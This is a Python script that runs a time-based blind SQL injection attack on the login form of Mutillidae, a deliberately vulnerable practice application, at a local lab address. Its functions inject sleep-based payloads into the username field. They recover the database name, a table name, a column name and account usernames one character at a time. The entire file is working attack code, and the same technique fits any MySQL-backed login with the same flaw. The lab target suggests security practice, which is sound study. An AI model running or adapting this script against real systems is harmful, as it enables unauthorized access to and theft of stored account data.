import sys
import requests
import urllib3
import urllib

u  = "http://192.168.1.104/mutillidae/index.php?page=login.php"
proxies = { "http" :  "http://127.0.0.1:8080", "https" :  "http://127.0.0.1:8080"}


def get_data():
    
    l = []
    data = "accounts"
    column = "username"
   
    pay = "admin' AND IF(ascii(substring((SELECT %s FROM %s "%(column, data)
 
    for k in range(1,3):
        table = ""
        
        pay2 = "LIMIT %s,1)" %(k)
        for i in range(1,10):
            for j in range(64, 128):
           
            #payload = "admin' AND IF(ascii(substring((SELECT TABLE_NAME FROM information_schema.TABLES  WHERE table_schema='%s' LIMIT 0,1),%s,1)) = %s,sleep(10),NULL)-- -" %(data,i,j)
                payload = pay + pay2+",%s,1)) = %s,sleep(10),NULL)-- -" %(i,j)
            #print(payload)
                data = { "username": payload, "password" : "admin", "login-php-submit-button": "Login" }
            

                r = requests.post(u, data=data) #proxies=proxies)
                if(r.elapsed.total_seconds() > 9):  
                    table += chr(j)
                    break
                else:   
                    None
        l.append(table)
   
    return l


def get_length():

    for i in range(1,10):
        payload = "admin' and if(length(database()) = %s, sleep(10), null)-- -" %(i)        
        data = { "username": payload, "password" : "admin", "login-php-submit-button": "Login" }
        r = requests.post(u, data=data) #proxies=proxies)
        if(r.elapsed.total_seconds() > 9):
            return i
        else:   
            None

def get_database(l):
    database = ""
    len = l+1
    for i in range(1,len):
        for j in range(97, 128):
            payload = "admin' and if(ascii(substring(database(),%s,1)) = %s, sleep(10), null)-- -" %(i,j)
            data = { "username": payload, "password" : "admin", "login-php-submit-button": "Login" }
            

            r = requests.post(u, data=data)# proxies=proxies)
            if(r.elapsed.total_seconds() > 9):  
                database += chr(j)
                
                break
            else:   
                None
    return database


def get_table(data):
    data = data
    table = ""
    pay = "admin' AND IF(ascii(substring((SELECT TABLE_NAME FROM information_schema.TABLES  WHERE table_schema='%s' "%(data)
 
    for i in range(1,10):
        for j in range(64, 128):
           
            #payload = "admin' AND IF(ascii(substring((SELECT TABLE_NAME FROM information_schema.TABLES  WHERE table_schema='%s' LIMIT 0,1),%s,1)) = %s,sleep(10),NULL)-- -" %(data,i,j)
            payload = pay + "LIMIT 0,1),%s,1)) = %s,sleep(10),NULL)-- -" %(i,j)
            #print(payload)
            data = { "username": payload, "password" : "admin", "login-php-submit-button": "Login" }
            

            r = requests.post(u, data=data)# proxies=proxies)
            if(r.elapsed.total_seconds() > 9):  
                table += chr(j)
                
                break
            else:   
                None
    return table

def get_columns(table):
    data = table
    table = ""
    pay = "admin' AND IF(ascii(substring((SELECT COLUMN_NAME FROM information_schema.COLUMNS  WHERE table_name='%s' "%(data)
 
    for i in range(1,10):
        for j in range(64, 128):
           
            #payload = "admin' AND IF(ascii(substring((SELECT TABLE_NAME FROM information_schema.TABLES  WHERE table_schema='%s' LIMIT 0,1),%s,1)) = %s,sleep(10),NULL)-- -" %(data,i,j)
            payload = pay + "LIMIT 1,1),%s,1)) = %s,sleep(10),NULL)-- -" %(i,j)
            #print(payload)
            data = { "username": payload, "password" : "admin", "login-php-submit-button": "Login" }
            

            r = requests.post(u, data=data) #proxies=proxies)
            if(r.elapsed.total_seconds() > 9):  
                table += chr(j)
                break
            else:   
                None
    return table            

def main():
            d = []
            """data = ""
            table = ""
            column = ""
            

            l = get_length()
            print("length of data is :", l)
            data +=get_database(l)
            print("Name of the database : ",data)
            database = data
            table += get_table(database)
            print("Name of table : ", table)

            #get_table(database)
            #print(table)
            column += get_columns(table)
            print("Name of column: ",column)
            dump =""
            #dump = get_data(column, table)
            #print("dumped data : ", dump)"""
            d = get_data()
            print(d[0])
            print(d[1])
            

if __name__ == "__main__":
    main() 
